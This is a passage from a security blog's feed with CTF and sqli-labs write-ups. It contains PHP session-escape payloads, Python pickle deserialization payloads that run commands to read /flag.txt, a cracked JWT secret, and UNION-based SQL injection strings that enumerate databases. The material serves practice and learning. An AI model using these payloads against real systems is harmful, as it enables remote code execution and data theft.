class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$filter_arr&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php5&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php4&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;fl1g&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.implode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$filter_arr&lt;/span&gt;).&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/i&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; preg_replace(&lt;span class=&#34;hljs-variable&#34;&gt;$filter&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;unset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;function&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;;&lt;br&gt;&lt;br&gt;extract(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;a href=&amp;quot;index.php?f=highlight_file&amp;quot;&amp;gt;source_code&amp;lt;/a&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;])&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = base64_encode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;guest_img.png&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = sha1(base64_encode(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;]));&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$serialize_info&lt;/span&gt; = filter(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;));&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;highlight_file&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;index.php&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;phpinfo&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;//maybe you can find something in here!&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;show_image&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$userinfo&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$serialize_info&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(base64_decode(&lt;span class=&#34;hljs-variable&#34;&gt;$userinfo&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]));&lt;br&gt;&amp;#125; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç»™å‡ºäº†phpinfoå¹¶ä¸”æç¤ºé‡Œé¢æœ‰å†…å®¹ï¼Œçœ‹åˆ°&lt;code&gt;d0g3_f1ag.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;çœ‹åˆ°ååºåˆ—åŒ–sessionï¼Œç›²çŒœåº”è¯¥æ˜¯session.upload_progressçš„é¢˜ç›®ï¼Œç„¶åfilterå‡½æ•°åº”è¯¥æ˜¯æ˜¯åˆ©ç”¨å­—ç¬¦é€ƒé€¸&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æœ‰ä¸€ä¸ª&lt;code&gt;extract($_POST);&lt;/code&gt;ï¼Œå½“æˆ‘ä»¬POSTä¸€ä¸ª_SESSIONå˜é‡ä¹‹åï¼Œå°±ä¼šè¦†ç›–SESSIONï¼Œè¿™é‡Œå°±æ˜¯å¯æ§ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å­—ç¬¦é€ƒé€¸ã€‚æˆ‘ä»¬éœ€è¦æ„é€ å‡ºæ¥çš„sessionæ˜¯&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;_SESSION&lt;/span&gt;[user]=&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flagphpphpflagphp&lt;/span&gt;&amp;amp;_SESSION[exp]=;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;img&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&amp;amp;_SESSION[function]=flagflagflagflagflagflagflagflagphpphp&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ‹¿åˆ°d0g3_f1ag.phpæºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag in /d0g3_fllllllag&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å‘ç°æ–‡ä»¶åç»è¿‡base64ç¼–ç åé•¿åº¦ä¸å˜ï¼Œæ”¹ä¸€ä¸‹å°±å¥½ï¼Œæ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å®‰æ´µæ¯-2019-easy-serialize-php-1&#34;&gt;&lt;a href=&#34;#å®‰æ´µæ¯-2019-easy-serialize-php-1&#34; class=&#34;headerlink&#34; title=&#34;[å®‰æ´µæ¯ 2019]easy_serialize_php&#34;&gt;&lt;/a&gt;[å®‰æ´µæ¯ 2019]easy_serialize_php&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æç¤ºæ‰¾åˆ°â€lv6â€ï¼Œç”¨è„šæœ¬è·‘ï¼Œåœ¨ç¬¬181é¡µ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¹°ä¸èµ·ï¼Œæ”¹æŠ˜æ‰£ï¼Œæç¤º&lt;code&gt;b1g_m4mber&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æç¤ºåªèƒ½adminè®¿é—®ï¼Œæœ‰JWT&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/brendan-rius/c-jwt-cracker&#34;&gt;https://github.com/brendan-rius/c-jwt-cracker&lt;/a&gt;  ç”¨è¿™ä¸ªå·¥å…·è·‘   å¯†é’¥æ˜¯&lt;code&gt;1Kun&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç”¨&lt;a href=&#34;https://jwt.io/#encoded-jwt%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%8B%BF%E5%88%B0%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84JWT%EF%BC%8C%E8%AE%BF%E9%97%AE%E6%8B%BF%E5%88%B0%E6%8F%90%E7%A4%BA%60/static/asd1f654e683wq/www.zip%60&#34;&gt;https://jwt.io/#encoded-jwtä¿®æ”¹ï¼Œæ‹¿åˆ°ä¿®æ”¹åçš„JWTï¼Œè®¿é—®æ‹¿åˆ°æç¤º`/static/asd1f654e683wq/www.zip`&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æºç ä¸­Admin.pyæœ‰ä¸€ä¸ªpickleè§¦å‘ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; marshal&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; base64&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;foo&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; commands&lt;br&gt;    output = commands.getstatusoutput(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cat /flag.txt&amp;#x27;&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; output&lt;br&gt;&lt;br&gt;payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;FunctionType&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(cmarshal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;loads&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(cbase64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;b64decode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(S&amp;#x27;%s&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;tRtRc__builtin__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;globals&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(tRS&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;tR(tR.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; % base64.b64encode(marshal.dumps(foo.func_code))&lt;br&gt;&lt;br&gt;&lt;br&gt;payload = urllib.quote(payload)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; payload&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;ç½‘ä¸Šç‰ˆæœ¬&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; pickle&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;A&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;object&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__reduce__&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        a = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;open(&amp;#x27;/flag.txt&amp;#x27;,&amp;#x27;r&amp;#x27;).read()&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;,(a,))&lt;br&gt;a = A()&lt;br&gt;test = pickle.dumps(a)&lt;br&gt;payload = urllib.quote(test)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; payload&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2019-11-20T14:49:13.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/10/12/Sqli-labs/</id>
        <title>Sqli-labs</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/10/12/Sqli-labs/"/>
        <content type="html">&lt;h1 id=&#34;æ³¨å…¥è¯­å¥å¤‡å¿˜&#34;&gt;&lt;a href=&#34;#æ³¨å…¥è¯­å¥å¤‡å¿˜&#34; class=&#34;headerlink&#34; title=&#34;æ³¨å…¥è¯­å¥å¤‡å¿˜&#34;&gt;&lt;/a&gt;æ³¨å…¥è¯­å¥å¤‡å¿˜&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;æŸ¥åº“åï¼š&lt;code&gt;select schema_name from information_schema.schemata&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æŸ¥è¡¨åï¼š&lt;code&gt;select table_name from information_schema.tables where table_schema=&amp;#39;åº“å&amp;#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æŸ¥åˆ—åï¼š&lt;code&gt;select column_name from information_schema.columns where table_name=&amp;#39;è¡¨å&amp;#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æŸ¥æ•°æ®ï¼š&lt;code&gt;select åˆ—å from åº“å.è¡¨å&lt;/code&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;æ³¨æ„&#34;&gt;&lt;a href=&#34;#æ³¨æ„&#34; class=&#34;headerlink&#34; title=&#34;æ³¨æ„&#34;&gt;&lt;/a&gt;æ³¨æ„&lt;/h1&gt;&lt;/li&gt;
&lt;li&gt;å¯å°†ç”¨å¼•å·åŒ…å«çš„åº“åï¼Œè¡¨åè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œé¿å…å¼•å·è¢«è¿‡æ»¤&lt;/li&gt;
&lt;li&gt;æ•°æ®è¿‡å¤šæ—¶å¯ä»¥åˆ©ç”¨limité™åˆ¶æ•°æ®æ•°é‡&lt;/li&gt;
&lt;li&gt;åŒä¸Šä¹Ÿå¯ä»¥ç”¨&lt;code&gt;concat&lt;/code&gt;é“¾æ¥å¤šä¸ªæ•°æ®æˆä¸ºä¸€æ¡è¿”å›ç»“æœ&lt;/li&gt;
&lt;li&gt;â€¦&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§&#34;&gt;&lt;a href=&#34;#æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§&#34; class=&#34;headerlink&#34; title=&#34;æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§&#34;&gt;&lt;/a&gt;æ³¨å…¥ç±»å‹åˆ¤æ–­å°æŠ€å·§&lt;/h1&gt;&lt;p&gt;1å’Œ1â€æ­£å¸¸å›æ˜¾ï¼Œ1â€™æŠ¥é”™ï¼Œåˆ¤æ–­ä¸ºå­—ç¬¦å‹ï¼Œä½†æ˜¯è¿˜è¦åˆ¤æ–­æ˜¯å¦æœ‰å°æ‹¬å·ã€‚&lt;/p&gt;
&lt;p&gt;åˆ¤æ–­å°æ‹¬å·æœ‰å‡ ç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;2â€™&amp;amp;&amp;amp;â€™1â€™=â€™1&lt;ul&gt;
&lt;li&gt;è‹¥æŸ¥è¯¢è¯­å¥ä¸ºwhere id=â€™$idâ€™ï¼ŒæŸ¥è¯¢æ—¶æ˜¯where id=â€™2â€™&amp;amp;&amp;amp;â€™1â€™=â€™1â€™ï¼Œç»“æœæ˜¯where id=â€™2â€™ï¼Œå›æ˜¾ä¼šæ˜¯id=2ã€‚&lt;/li&gt;
&lt;li&gt;è‹¥æŸ¥è¯¢è¯­å¥ä¸ºwhere id=(â€˜$idâ€™)ï¼ŒæŸ¥è¯¢æ—¶æ˜¯where id=(â€˜2â€™&amp;amp;&amp;amp;â€™1â€™=â€™1â€™)ï¼ŒMySQL å°†â€™2â€™ä½œä¸ºäº† Bool å€¼ï¼Œç»“æœæ˜¯where id=(â€˜1â€™)ï¼Œå›æ˜¾ä¼šæ˜¯id=1ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1â€™)||â€™1â€™=(â€˜1&lt;br&gt;è‹¥æŸ¥è¯¢è¯­å¥æœ‰å°æ‹¬å·æ­£ç¡®å›æ˜¾ï¼Œè‹¥æ— å°æ‹¬å·é”™è¯¯å›æ˜¾ï¼ˆæ— å›æ˜¾ï¼‰ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;sqli-labsæµ‹è¯•&#34;&gt;&lt;a href=&#34;#sqli-labsæµ‹è¯•&#34; class=&#34;headerlink&#34; title=&#34;sqli-labsæµ‹è¯•&#34;&gt;&lt;/a&gt;sqli-labsæµ‹è¯•&lt;/h1&gt;&lt;h2 id=&#34;Less-1&#34;&gt;&lt;a href=&#34;#Less-1&#34; class=&#34;headerlink&#34; title=&#34;Less-1&#34;&gt;&lt;/a&gt;Less-1&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;æ„é€ &lt;code&gt;127.0.0.1/Less-1/?id=1&lt;/code&gt;æˆåŠŸè¿”å›æ•°æ®&lt;/li&gt;
&lt;li&gt;æ„é€ &lt;code&gt;127.0.0.1/Less-1/?id=1&amp;#39;&lt;/code&gt;å‡ºç°æŠ¥é”™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹&lt;/li&gt;
&lt;li&gt;æ„é€ &lt;code&gt;127.0.0.1/Less-1/?id=1&amp;#39; order by 3--+&lt;/code&gt;æµ‹è¯•æœ‰å‡ åˆ—&lt;/li&gt;
&lt;li&gt;æ„é€ &lt;code&gt;127.0.0.1/Less-1/?id=-1&amp;#39; union select 1,2,3--+&lt;/code&gt;æŸ¥çœ‹å›æ˜¾ç‚¹//æ­¤æ—¶éœ€è¦ä»¤æŸ¥è¯¢çš„idä¸å­˜åœ¨&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/1.png&#34; alt=&#34;sql&#34;&gt;&lt;/li&gt;
&lt;li&gt;æ„é€ &lt;code&gt;127.0.0.1/Less-1/?id=-1&amp;#39; union select 1,2,(select schema_name from information_schema.schemata)--+&lt;/code&gt;æŸ¥è¯¢æ•°æ®åº“åã€‚å‘ç°æŠ¥é”™è¯´æ•°æ®è¿‡å¤šï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨limitæ„é€ ï¼š&lt;code&gt;127.0.0.1/Less-1/?id=-1&amp;#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)--+&lt;/code&gt;ä¾æ¬¡è¿›è¡ŒæŸ¥çœ‹ã€‚&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/2.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;æˆ–è€…å¯ä»¥åˆ©ç”¨&lt;code&gt;group_concat&lt;/code&gt;æ„é€ ï¼š&lt;code&gt;?id=-1&amp;#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+&lt;/code&gt;&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/3.png&#34; alt=&#34;sql&#34;&gt;&lt;/li&gt;
